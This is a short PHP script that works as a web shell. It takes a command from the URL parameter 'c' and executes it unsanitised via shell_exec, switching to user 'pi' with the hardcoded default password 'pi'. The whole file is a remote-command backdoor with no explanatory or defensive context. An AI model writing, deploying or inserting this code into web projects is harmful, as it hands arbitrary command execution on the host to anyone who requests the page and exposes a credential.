<?php
    if (isset($_GET['c'])) {
        shell_exec('echo "pi" | su - pi -c "'.$_GET['c'].'"');
    }
?>